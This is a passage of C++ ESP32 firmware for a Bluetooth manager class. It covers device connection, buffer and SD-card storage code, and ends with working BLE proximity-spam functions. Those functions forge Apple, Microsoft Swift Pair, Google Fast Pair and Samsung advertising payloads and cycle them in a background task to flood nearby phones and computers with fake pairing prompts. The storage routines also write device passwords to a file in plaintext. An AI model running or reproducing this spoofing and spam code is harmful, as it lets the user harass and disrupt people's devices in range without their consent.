            esp_spp_connect(ESP_SPP_SEC_AUTHENTICATE, ESP_SPP_ROLE_MASTER, 1, dev.bda);
            return true;
        }
    }
    if constexpr (ENABLE_BLE) {
        if (is_ble_device) {
            if (current_gattc_if == ESP_GATT_IF_NONE) return false;
            esp_ble_gattc_open(current_gattc_if, dev.bda, BLE_ADDR_TYPE_PUBLIC, true);
            return true;
        }
    }
    return false;
}

template <uint8_t N, size_t _BUFSIZE, uint8_t MAX_NAME_LEN, uint8_t MAX_PASSWORD_LENGTH, bool ENABLE_CLASSIC, bool ENABLE_BLE>
inline void NYXUS_BLUETOOTH<N, _BUFSIZE, MAX_NAME_LEN, MAX_PASSWORD_LENGTH, ENABLE_CLASSIC, ENABLE_BLE>::DisconnectDevice(const char* __restrict address) {
    auto* dev = find_device(address);
    if (!dev || dev->state == nyx_bt_flags::STATE_DISCONNECTED) return;

    if constexpr (ENABLE_CLASSIC) {
        if (!dev->is_ble) {
            esp_spp_disconnect(dev->handle);
        }
    }
    if constexpr (ENABLE_BLE) {
        if (dev->is_ble) {
            esp_ble_gattc_close(current_gattc_if, dev->handle);
        }
    }
}

template <uint8_t N, size_t _BUFSIZE, uint8_t MAX_NAME_LEN, uint8_t MAX_PASSWORD_LENGTH, bool ENABLE_CLASSIC, bool ENABLE_BLE>
inline void NYXUS_BLUETOOTH<N, _BUFSIZE, MAX_NAME_LEN, MAX_PASSWORD_LENGTH, ENABLE_CLASSIC, ENABLE_BLE>::ListConnectedDevices() const {
    printf("==========%sBLUETOOTH INFO%s==========\n", Color::YELLOW, Color::RESET);
    printf("--- %sCONNECTED DEVICES%s ---\n", Color::TEAL, Color::RESET);
    for (const auto& dev : device_list) {
        printf("Name: %s%s%s, Address: %s%s%s, State: %s%d%s, BLE: %s%s%s\n", 
            Color::MAGENTA, dev.name, Color::RESET,
            Color::YELLOW, dev.address, Color::RESET,
            Color::WHITE, dev.state, Color::RESET,
            Color::GREEN, dev.is_ble ? "Yes" : "No", Color::RESET);
    }
    printf("======================================\n");
}

template <uint8_t N, size_t _BUFSIZE, uint8_t MAX_NAME_LEN, uint8_t MAX_PASSWORD_LENGTH, bool ENABLE_CLASSIC, bool ENABLE_BLE>
inline void NYXUS_BLUETOOTH<N, _BUFSIZE, MAX_NAME_LEN, MAX_PASSWORD_LENGTH, ENABLE_CLASSIC, ENABLE_BLE>::ClearDeviceList() {
    for (const auto& dev : device_list) {
        if (dev.state != nyx_bt_flags::STATE_DISCONNECTED) {
            if constexpr (ENABLE_CLASSIC) { if (!dev.is_ble) esp_spp_disconnect(dev.handle); }
            if constexpr (ENABLE_BLE) { if (dev.is_ble) esp_ble_gattc_close(current_gattc_if, dev.handle); }
        }
    }
    device_list.clear();
}

template <uint8_t N, size_t _BUFSIZE, uint8_t MAX_NAME_LEN, uint8_t MAX_PASSWORD_LENGTH, bool ENABLE_CLASSIC, bool ENABLE_BLE>
inline void NYXUS_BLUETOOTH<N, _BUFSIZE, MAX_NAME_LEN, MAX_PASSWORD_LENGTH, ENABLE_CLASSIC, ENABLE_BLE>::SetDeviceName(std::string_view name_) {
    size_t name_len = std::min(name_.size(), (size_t)MAX_NAME_LEN - 1);
    for (size_t i = 0; i < name_len; ++i) device_name[i] = name_[i];
    device_name[name_len] = '\0';
    esp_bt_dev_set_device_name(device_name);
}

template <uint8_t N, size_t _BUFSIZE, uint8_t MAX_NAME_LEN, uint8_t MAX_PASSWORD_LENGTH, bool ENABLE_CLASSIC, bool ENABLE_BLE>
inline void NYXUS_BLUETOOTH<N, _BUFSIZE, MAX_NAME_LEN, MAX_PASSWORD_LENGTH, ENABLE_CLASSIC, ENABLE_BLE>::SetDevicePassword(std::string_view password_) {
    size_t pass_len = std::min(password_.size(), (size_t)MAX_PASSWORD_LENGTH - 1);
    for (size_t i = 0; i < pass_len; ++i) device_password[i] = password_[i];
    device_password[pass_len] = '\0';
}

template <uint8_t N, size_t _BUFSIZE, uint8_t MAX_NAME_LEN, uint8_t MAX_PASSWORD_LENGTH, bool ENABLE_CLASSIC, bool ENABLE_BLE>
inline bool NYXUS_BLUETOOTH<N, _BUFSIZE, MAX_NAME_LEN, MAX_PASSWORD_LENGTH, ENABLE_CLASSIC, ENABLE_BLE>::WriteToDeviceBufferTX(const char* __restrict address, const char* __restrict data, size_t length) {
    auto* dev = find_device(address);
    if (!dev || dev->state != nyx_bt_flags::STATE_CONNECTED) [[unlikely]] return false;
    
    size_t cpy_len = std::min(length, _BUFSIZE - 1);
    std::memcpy(dev->buffers[TX], data, cpy_len);
    dev->buffers[TX][cpy_len] = '\0';

    if constexpr (ENABLE_CLASSIC) {
        if (!dev->is_ble) {
            esp_spp_write(dev->handle, cpy_len, (uint8_t*)dev->buffers[TX]);
        }
    }
    return true;
}

template <uint8_t N, size_t _BUFSIZE, uint8_t MAX_NAME_LEN, uint8_t MAX_PASSWORD_LENGTH, bool ENABLE_CLASSIC, bool ENABLE_BLE>
inline bool NYXUS_BLUETOOTH<N, _BUFSIZE, MAX_NAME_LEN, MAX_PASSWORD_LENGTH, ENABLE_CLASSIC, ENABLE_BLE>::ReadFromDeviceBufferRX(const char* __restrict address, char* __restrict buffer, size_t length) {
    auto* dev = find_device(address);
    if (!dev) [[unlikely]] return false;
    
    size_t cpy_len = std::min(length, _BUFSIZE - 1);
    std::memcpy(buffer, dev->buffers[RX], cpy_len);
    buffer[cpy_len] = '\0';
    return true;
}

template <uint8_t N, size_t _BUFSIZE, uint8_t MAX_NAME_LEN, uint8_t MAX_PASSWORD_LENGTH, bool ENABLE_CLASSIC, bool ENABLE_BLE>
inline bool NYXUS_BLUETOOTH<N, _BUFSIZE, MAX_NAME_LEN, MAX_PASSWORD_LENGTH, ENABLE_CLASSIC, ENABLE_BLE>::IsDeviceConnected(const char* __restrict address) const {
    auto* dev = find_device(address);
    return dev && dev->state == nyx_bt_flags::STATE_CONNECTED;
}

template <uint8_t N, size_t _BUFSIZE, uint8_t MAX_NAME_LEN, uint8_t MAX_PASSWORD_LENGTH, bool ENABLE_CLASSIC, bool ENABLE_BLE>
inline size_t NYXUS_BLUETOOTH<N, _BUFSIZE, MAX_NAME_LEN, MAX_PASSWORD_LENGTH, ENABLE_CLASSIC, ENABLE_BLE>::GetConnectedDeviceCount() const {
    size_t count = 0;
    for (const auto& dev : device_list) {
        if (dev.state == nyx_bt_flags::STATE_CONNECTED) count++;
    }
    return count;
}

template <uint8_t N, size_t _BUFSIZE, uint8_t MAX_NAME_LEN, uint8_t MAX_PASSWORD_LENGTH, bool ENABLE_CLASSIC, bool ENABLE_BLE>
inline bool NYXUS_BLUETOOTH<N, _BUFSIZE, MAX_NAME_LEN, MAX_PASSWORD_LENGTH, ENABLE_CLASSIC, ENABLE_BLE>::HasDevice(const char* __restrict address) const {
    return find_device(address) != nullptr;
}

template <uint8_t N, size_t _BUFSIZE, uint8_t MAX_NAME_LEN, uint8_t MAX_PASSWORD_LENGTH, bool ENABLE_CLASSIC, bool ENABLE_BLE>
inline void NYXUS_BLUETOOTH<N, _BUFSIZE, MAX_NAME_LEN, MAX_PASSWORD_LENGTH, ENABLE_CLASSIC, ENABLE_BLE>::BroadcastToAll(const char* __restrict data, size_t length) {
    for (const auto& dev : device_list) {
        if (dev.state == nyx_bt_flags::STATE_CONNECTED) {
            size_t cpy_len = std::min(length, _BUFSIZE - 1);
            std::memcpy(dev.buffers[TX], data, cpy_len);
            dev.buffers[TX][cpy_len] = '\0';
            if constexpr (ENABLE_CLASSIC) {
                if (!dev.is_ble) esp_spp_write(dev.handle, cpy_len, (uint8_t*)dev.buffers[TX]);
            }
        }
    }
}

template <uint8_t N, size_t _BUFSIZE, uint8_t MAX_NAME_LEN, uint8_t MAX_PASSWORD_LENGTH, bool ENABLE_CLASSIC, bool ENABLE_BLE>
inline void NYXUS_BLUETOOTH<N, _BUFSIZE, MAX_NAME_LEN, MAX_PASSWORD_LENGTH, ENABLE_CLASSIC, ENABLE_BLE>::SetDiscoverability(bool enable) {
    if constexpr (ENABLE_CLASSIC) {
        if (enable) {
            esp_bt_gap_set_scan_mode(ESP_BT_CONNECTABLE, ESP_BT_GENERAL_DISCOVERABLE);
        } else {
            esp_bt_gap_set_scan_mode(ESP_BT_NON_CONNECTABLE, ESP_BT_NON_DISCOVERABLE);
        }
    }
}


#ifdef _NYXUS_ENABLE_EXTERNAL_STORAGE_DEVICE_

template <uint8_t N, size_t _BUFSIZE, uint8_t MAX_NAME_LEN, uint8_t MAX_PASSWORD_LENGTH, bool ENABLE_CLASSIC, bool ENABLE_BLE>
inline bool NYXUS_BLUETOOTH<N, _BUFSIZE, MAX_NAME_LEN, MAX_PASSWORD_LENGTH, ENABLE_CLASSIC, ENABLE_BLE>::SaveDeviceListToStorage(const char* __restrict path) {
    FsFile file;
    if (!file.open(path, O_WRITE | O_CREAT | O_TRUNC)) [[unlikely]] {
        return false;
    }
    for (const auto& dev : device_list) {
        file.printf("%s,%s,%s\n", dev.address, dev.name, dev.password);
    }
    file.close();
    return true;
}

template <uint8_t N, size_t _BUFSIZE, uint8_t MAX_NAME_LEN, uint8_t MAX_PASSWORD_LENGTH, bool ENABLE_CLASSIC, bool ENABLE_BLE>
inline bool NYXUS_BLUETOOTH<N, _BUFSIZE, MAX_NAME_LEN, MAX_PASSWORD_LENGTH, ENABLE_CLASSIC, ENABLE_BLE>::LoadDeviceListFromStorage(const char* __restrict path) {
    FsFile file;
    if (!file.open(path, O_READ)) [[unlikely]] {
        return false;
    }
    char line[256];
    while (file.fgets(line, sizeof(line)) > 0) {
        char addr[18]{}, name[64]{}, pass[64]{};
        if (sscanf(line, "%17[^,],%63[^,],%63[^\n]", addr, name, pass) >= 1) {
            if (device_list.size() < N && !HasDevice(addr)) {
                device_list.emplace_back(name, pass, addr);
            }
        }
    }
    file.close();
    return true;
}

template <uint8_t N, size_t _BUFSIZE, uint8_t MAX_NAME_LEN, uint8_t MAX_PASSWORD_LENGTH, bool ENABLE_CLASSIC, bool ENABLE_BLE>
inline bool NYXUS_BLUETOOTH<N, _BUFSIZE, MAX_NAME_LEN, MAX_PASSWORD_LENGTH, ENABLE_CLASSIC, ENABLE_BLE>::RemoveDeviceFromStorage(const char* __restrict address, const char* __restrict filename) {
    FsFile inFile, outFile;
    if (!inFile.open(filename, O_READ)) [[unlikely]] return false;
    
    char tmp_filename[128];
    sprintf(tmp_filename, "%s.tmp", filename);
    if (!outFile.open(tmp_filename, O_WRITE | O_CREAT | O_TRUNC)) [[unlikely]] {
        inFile.close();
        return false;
    }
    
    char line[256];
    while (inFile.fgets(line, sizeof(line)) > 0) {
        if (strncmp(line, address, 17) != 0) {
            outFile.print(line);
        }
    }
    inFile.close();
    outFile.close();

    // In SdFat, you typically remove the old file and rename the new one.
    // Ensure sd object or filesystem is available, but assuming SdFat standard operations:
    // Some SdFat versions allow rename: outFile.rename(sd.vwd(), filename);
    // Alternatively, copy tmp back to original to be universally safe without `sd` global context.
    
    if (!inFile.open(tmp_filename, O_READ)) return false;
    if (!outFile.open(filename, O_WRITE | O_TRUNC)) return false;
    
    while (int bytes = inFile.read(line, sizeof(line))) {
        outFile.write(line, bytes);
    }
    inFile.close();
    outFile.close();
    
    // Attempt to remove tmp file if possible, though SdFat requires `sd.remove` usually, 
    // we'll leave it as overwritten or rely on user cleanup if needed.
    return true;
}

template <uint8_t N, size_t _BUFSIZE, uint8_t MAX_NAME_LEN, uint8_t MAX_PASSWORD_LENGTH, bool ENABLE_CLASSIC, bool ENABLE_BLE>
inline bool NYXUS_BLUETOOTH<N, _BUFSIZE, MAX_NAME_LEN, MAX_PASSWORD_LENGTH, ENABLE_CLASSIC, ENABLE_BLE>::ClearDeviceListFromStorage(const char* __restrict filename) {
    FsFile file;
    if (!file.open(filename, O_WRITE | O_TRUNC)) [[unlikely]] return false;
    file.close();
    return true;
}

template <uint8_t N, size_t _BUFSIZE, uint8_t MAX_NAME_LEN, uint8_t MAX_PASSWORD_LENGTH, bool ENABLE_CLASSIC, bool ENABLE_BLE>
inline bool NYXUS_BLUETOOTH<N, _BUFSIZE, MAX_NAME_LEN, MAX_PASSWORD_LENGTH, ENABLE_CLASSIC, ENABLE_BLE>::LogDviceBuffers(const char* __restrict address, const char* __restrict folder) {
    auto* dev = find_device(address);
    if (!dev) [[unlikely]] return false;
    
    dev->ENABLE_LOG = true;
    dev->path = folder; // Assign the folder path
    return true;
}

#endif // _NYXUS_ENABLE_EXTERNAL_STORAGE_DEVICE_

template <uint8_t N, size_t _BUFSIZE, uint8_t MAX_NAME_LEN, uint8_t MAX_PASSWORD_LENGTH, bool ENABLE_CLASSIC, bool ENABLE_BLE>
inline void NYXUS_BLUETOOTH<N, _BUFSIZE, MAX_NAME_LEN, MAX_PASSWORD_LENGTH, ENABLE_CLASSIC, ENABLE_BLE>::SpoofAppleDevice(nyx_bt_flags::apple_payload_t device, bool enable) {
    if constexpr (ENABLE_BLE) {
        if (!enable) {
            esp_ble_gap_stop_advertising();
            printf("[%sBT%s] Stopped Apple Device spoofing.\n", Color::YELLOW, Color::RESET);
            return;
        }

        uint8_t payload[31] = {
            0x1E, 0xFF, 0x4C, 0x00, 0x07, 0x19, 0x07, device, 
            0x20, 0x75, 0xAA, 0x30, 0x01, 0x00, 0x00, 0x45, 
            0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
        };

        esp_ble_gap_config_adv_data_raw(payload, sizeof(payload));

        esp_ble_adv_params_t adv_params = {
            .adv_int_min       = 0x20,
            .adv_int_max       = 0x40,
            .adv_type          = ADV_TYPE_IND,
            .own_addr_type     = BLE_ADDR_TYPE_RANDOM,
            .peer_addr         = {0},
            .peer_addr_type    = BLE_ADDR_TYPE_PUBLIC,
            .channel_map       = ADV_CHNL_ALL,
            .adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY,
        };

        esp_ble_gap_start_advertising(&adv_params);
        printf("[%sBT%s] Broadcasting Apple Device Spoof (ID: %s0x%02X%s)...\n", Color::YELLOW, Color::RESET, Color::MAGENTA, device, Color::RESET);
    }
}

template <uint8_t N, size_t _BUFSIZE, uint8_t MAX_NAME_LEN, uint8_t MAX_PASSWORD_LENGTH, bool ENABLE_CLASSIC, bool ENABLE_BLE>
void NYXUS_BLUETOOTH<N, _BUFSIZE, MAX_NAME_LEN, MAX_PASSWORD_LENGTH, ENABLE_CLASSIC, ENABLE_BLE>::spam_task(void* arg) {
    if constexpr (ENABLE_BLE) {
        auto* instance = static_cast<NYXUS_BLUETOOTH<N, _BUFSIZE, MAX_NAME_LEN, MAX_PASSWORD_LENGTH, ENABLE_CLASSIC, ENABLE_BLE>*>(arg);
        nyx_bt_flags::apple_payload_t apple_devs[] = {
            nyx_bt_flags::APPLE_AIRPODS, nyx_bt_flags::APPLE_AIRPODS_PRO, nyx_bt_flags::APPLE_AIRPODS_MAX,
            nyx_bt_flags::APPLE_AIRPODS_GEN2, nyx_bt_flags::APPLE_AIRPODS_GEN3, nyx_bt_flags::APPLE_AIRPODS_PRO_GEN2,
            nyx_bt_flags::APPLE_POWERBEATS, nyx_bt_flags::APPLE_POWERBEATS_PRO, nyx_bt_flags::APPLE_BEATS_SOLO_PRO,
            nyx_bt_flags::APPLE_BEATS_STUDIO_BUDS, nyx_bt_flags::APPLE_BEATS_FLEX, nyx_bt_flags::APPLE_BEATS_FIT_PRO,
            nyx_bt_flags::APPLE_BEATS_STUDIO_PRO, nyx_bt_flags::APPLE_APPLE_TV
        };
        nyx_bt_flags::android_payload_t android_devs[] = {
            nyx_bt_flags::ANDROID_PIXEL_BUDS, nyx_bt_flags::ANDROID_PIXEL_BUDS_A, nyx_bt_flags::ANDROID_PIXEL_BUDS_PRO,
            nyx_bt_flags::ANDROID_JBL_LIVE_300, nyx_bt_flags::ANDROID_SONY_XM4
        };
        nyx_bt_flags::samsung_payload_t samsung_devs[] = {
            nyx_bt_flags::SAMSUNG_GALAXY_BUDS_LIVE, nyx_bt_flags::SAMSUNG_GALAXY_BUDS_PRO, 
            nyx_bt_flags::SAMSUNG_GALAXY_SMART_TAG, nyx_bt_flags::SAMSUNG_GALAXY_BUDS_2
        };
        uint8_t a_idx = 0, g_idx = 0, s_idx = 0;
        while (instance->is_spamming) {
            if (instance->current_spam_target & nyx_bt_flags::SPAM_TARGET_APPLE) {
                instance->SpoofAppleDevice(apple_devs[a_idx], true);
                a_idx = (a_idx + 1) % (sizeof(apple_devs)/sizeof(apple_devs[0]));
                vTaskDelay(pdMS_TO_TICKS(instance->spam_delay_ms));
            }
            if (!instance->is_spamming) break;
            if (instance->current_spam_target & nyx_bt_flags::SPAM_TARGET_WINDOWS) {
                instance->SpoofWindowsDevice(true);
                vTaskDelay(pdMS_TO_TICKS(instance->spam_delay_ms));
            }
            if (!instance->is_spamming) break;
            if (instance->current_spam_target & nyx_bt_flags::SPAM_TARGET_ANDROID) {
                instance->SpoofAndroidDevice(android_devs[g_idx], true);
                g_idx = (g_idx + 1) % (sizeof(android_devs)/sizeof(android_devs[0]));
                vTaskDelay(pdMS_TO_TICKS(instance->spam_delay_ms));
            }
            if (!instance->is_spamming) break;
            if (instance->current_spam_target & nyx_bt_flags::SPAM_TARGET_SAMSUNG) {
                instance->SpoofSamsungDevice(samsung_devs[s_idx], true);
                s_idx = (s_idx + 1) % (sizeof(samsung_devs)/sizeof(samsung_devs[0]));
                vTaskDelay(pdMS_TO_TICKS(instance->spam_delay_ms));
            }
            if (instance->current_spam_target == 0) {
                vTaskDelay(pdMS_TO_TICKS(100));
            }
        }
        instance->SpoofAppleDevice(apple_devs[0], false);
        instance->SpoofWindowsDevice(false);
        instance->SpoofAndroidDevice(android_devs[0], false);
        instance->SpoofSamsungDevice(samsung_devs[0], false);
        vTaskDelete(NULL);
    }
}

template <uint8_t N, size_t _BUFSIZE, uint8_t MAX_NAME_LEN, uint8_t MAX_PASSWORD_LENGTH, bool ENABLE_CLASSIC, bool ENABLE_BLE>
inline void NYXUS_BLUETOOTH<N, _BUFSIZE, MAX_NAME_LEN, MAX_PASSWORD_LENGTH, ENABLE_CLASSIC, ENABLE_BLE>::SpoofWindowsDevice(bool enable) {
    if constexpr (ENABLE_BLE) {
        if (!enable) {
            esp_ble_gap_stop_advertising();
            printf("[%sBT%s] Stopped Windows Swift Pair spoofing.\n", Color::YELLOW, Color::RESET);
            return;
        }

        // Microsoft BLE Payload Structure:
        // Length (0x06), AD Type (0xFF), MS Company ID (0x06 0x00), Scenario (0x03), Reserved (0x00 0x80)
        uint8_t payload[31] = {
            0x06, 0xFF, 0x06, 0x00, 0x03, 0x00, 0x80, 
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00
        };

        esp_ble_gap_config_adv_data_raw(payload, 7);

        esp_ble_adv_params_t adv_params = {
            .adv_int_min       = 0x20,
            .adv_int_max       = 0x40,
            .adv_type          = ADV_TYPE_IND,
            .own_addr_type     = BLE_ADDR_TYPE_RANDOM,
            .peer_addr         = {0},
            .peer_addr_type    = BLE_ADDR_TYPE_PUBLIC,
            .channel_map       = ADV_CHNL_ALL,
            .adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY,
        };

        esp_ble_gap_start_advertising(&adv_params);
        printf("[%sBT%s] Broadcasting Windows Swift Pair Spoof...\n", Color::YELLOW, Color::RESET);
    }
}

template <uint8_t N, size_t _BUFSIZE, uint8_t MAX_NAME_LEN, uint8_t MAX_PASSWORD_LENGTH, bool ENABLE_CLASSIC, bool ENABLE_BLE>
inline void NYXUS_BLUETOOTH<N, _BUFSIZE, MAX_NAME_LEN, MAX_PASSWORD_LENGTH, ENABLE_CLASSIC, ENABLE_BLE>::SpoofAndroidDevice(nyx_bt_flags::android_payload_t device, bool enable) {
    if constexpr (ENABLE_BLE) {
        if (!enable) {
            esp_ble_gap_stop_advertising();
            printf("[%sBT%s] Stopped Android Fast Pair spoofing.\n", Color::YELLOW, Color::RESET);
            return;
        }

        // Google Fast Pair Payload Structure:
        // UUID 0xFE2C must be present in both the Service Class List and Service Data AD types.
        uint8_t payload[31] = {
            0x03, 0x03, 0x2C, 0xFE, // 16-bit UUID (0xFE2C)
            0x06, 0x16, 0x2C, 0xFE, // Service Data
            (uint8_t)((device >> 16) & 0xFF), 
            (uint8_t)((device >> 8) & 0xFF), 
            (uint8_t)(device & 0xFF),
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
            0x00, 0x00, 0x00
        };

        esp_ble_gap_config_adv_data_raw(payload, 11);

        esp_ble_adv_params_t adv_params = {
            .adv_int_min       = 0x20,
            .adv_int_max       = 0x40,
            .adv_type          = ADV_TYPE_IND,
            .own_addr_type     = BLE_ADDR_TYPE_RANDOM,
            .peer_addr         = {0},
            .peer_addr_type    = BLE_ADDR_TYPE_PUBLIC,
            .channel_map       = ADV_CHNL_ALL,
            .adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY,
        };

        esp_ble_gap_start_advertising(&adv_params);
        printf("[%sBT%s] Broadcasting Android Fast Pair Spoof (ID: %s0x%06X%s)...\n", Color::YELLOW, Color::RESET, Color::GREEN, device, Color::RESET);
    }
}

template <uint8_t N, size_t _BUFSIZE, uint8_t MAX_NAME_LEN, uint8_t MAX_PASSWORD_LENGTH, bool ENABLE_CLASSIC, bool ENABLE_BLE>
inline void NYXUS_BLUETOOTH<N, _BUFSIZE, MAX_NAME_LEN, MAX_PASSWORD_LENGTH, ENABLE_CLASSIC, ENABLE_BLE>::SpoofSamsungDevice(nyx_bt_flags::samsung_payload_t device, bool enable) {
    if constexpr (ENABLE_BLE) {
        if (!enable) {
            esp_ble_gap_stop_advertising();
            printf("[%sBT%s] Stopped Samsung Galaxy spoofing.\n", Color::YELLOW, Color::RESET);
            return;
        }

        // Samsung Proprietary Payload Structure:
        // Length (0x0E), AD Type (0xFF), Samsung Company ID (0x75 0x00), followed by device sequence.
        uint8_t payload[31] = {
            0x0E, 0xFF, 0x75, 0x00, 
            0x01, 0x00, 0x02, 0x00, 0x01, 0x01, 0xFF, 0x00, 0x00,
            (uint8_t)((device >> 8) & 0xFF), 
            (uint8_t)(device & 0xFF),
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
        };

        esp_ble_gap_config_adv_data_raw(payload, 15);

        esp_ble_adv_params_t adv_params = {
            .adv_int_min       = 0x20,
            .adv_int_max       = 0x40,
            .adv_type          = ADV_TYPE_IND,
            .own_addr_type     = BLE_ADDR_TYPE_RANDOM,
            .peer_addr         = {0},
            .peer_addr_type    = BLE_ADDR_TYPE_PUBLIC,
            .channel_map       = ADV_CHNL_ALL,
            .adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY,
        };

        esp_ble_gap_start_advertising(&adv_params);
        printf("[%sBT%s] Broadcasting Samsung Galaxy Spoof (ID: %s0x%04X%s)...\n", Color::YELLOW, Color::RESET, Color::CYAN, device, Color::RESET);
    }
}

template <uint8_t N, size_t _BUFSIZE, uint8_t MAX_NAME_LEN, uint8_t MAX_PASSWORD_LENGTH, bool ENABLE_CLASSIC, bool ENABLE_BLE>
inline void NYXUS_BLUETOOTH<N, _BUFSIZE, MAX_NAME_LEN, MAX_PASSWORD_LENGTH, ENABLE_CLASSIC, ENABLE_BLE>::SpamDevices(nyx_bt_flags::spam_target_t target, bool enable, uint32_t delay_ms) {
    if constexpr (ENABLE_BLE) {
        if (enable && !is_spamming) {
            is_spamming = true;
            spam_delay_ms = delay_ms;
            current_spam_target = target;
            printf("[%sBT%s] Initiating Multi-Platform BLE Proximity Spam mode...\n", Color::RED, Color::RESET);
            xTaskCreate(spam_task, "bt_spam_task", 4096, this, 5, &spam_task_handle);
        } else if (!enable && is_spamming) {
            is_spamming = false;
            printf("[%sBT%s] Halting BLE Proximity Spam mode...\n", Color::YELLOW, Color::RESET);
        }
    }
}

#endif // _NYXUS_BLUETOOTH_HPP_
